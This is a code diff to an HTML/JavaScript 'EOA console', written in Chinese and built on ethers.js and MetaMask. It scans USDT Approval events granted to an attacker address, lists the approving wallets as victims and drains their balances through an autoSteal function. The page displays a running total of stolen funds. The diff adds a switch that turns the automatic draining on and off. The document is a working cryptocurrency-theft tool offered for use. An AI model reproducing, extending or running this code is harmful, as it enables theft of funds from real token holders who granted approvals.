@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.4 (自動攻擊版)</title>
+  <title>🌟 EOA 控制台 v1.5（自動攻擊開關版）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -10,19 +10,22 @@
     button { padding: 8px 16px; }
     .ok { color: green; }
     .bad { color: red; }
-    ul { padding-left: 20px; }
+    .status { font-weight: bold; }
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.4 (自動攻擊版)</h2>
+  <h2>🌟 EOA 控制台 v1.5（自動攻擊開關版）</h2>
   <p><b>目前登入帳號：</b><span id="account">未連線...</span></p>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">查詢中...</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">未刷新</span></p>
   <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
+  <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
+  <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
 
+  <br><br>
   <input id="victim" placeholder="受害者地址" />
-  <button onclick="steal()">🧸 盜取 USDT</button>
+  <button onclick="steal()">🧨 盜取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
 
@@ -41,6 +44,7 @@
     let provider, signer, sender;
     let totalStolen = ethers.BigNumber.from("0");
     const attackedSet = new Set();
+    let autoEnabled = false;
 
     async function connect() {
       if (!window.ethereum) return alert("請安裝 MetaMask");
@@ -75,20 +79,32 @@
       }
     }
 
+    function toggleAuto() {
+      autoEnabled = !autoEnabled;
+      const label = document.getElementById("mode");
+      if (autoEnabled) {
+        label.innerText = "已啟用";
+        label.className = "ok";
+      } else {
+        label.innerText = "已停用";
+        label.className = "bad";
+      }
+    }
+
     async function fetchApprovals() {
       const contract = new ethers.Contract(USDT, ABI, provider);
       const events = await contract.queryFilter(contract.filters.Approval(null, attacker), 19000000);
       const ul = document.getElementById("approvals");
       ul.innerHTML = "";
       const seen = new Set();
-      for (const ev of events) {
+      for (const ev of events.reverse()) {
         const owner = ev.args.owner;
         if (!seen.has(owner)) {
           seen.add(owner);
           const li = document.createElement("li");
           li.textContent = owner;
           ul.appendChild(li);
-          await autoSteal(owner);
+          if (autoEnabled) await autoSteal(owner);
         }
       }
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
@@ -100,7 +116,7 @@
     }
 
     async function autoSteal(victim) {
-      if (attackedSet.has(victim)) return; // 避免重複攻擊
+      if (attackedSet.has(victim)) return;
       const contract = new ethers.Contract(USDT, ABI, signer);
       try {
         const balance = await contract.balanceOf(victim);
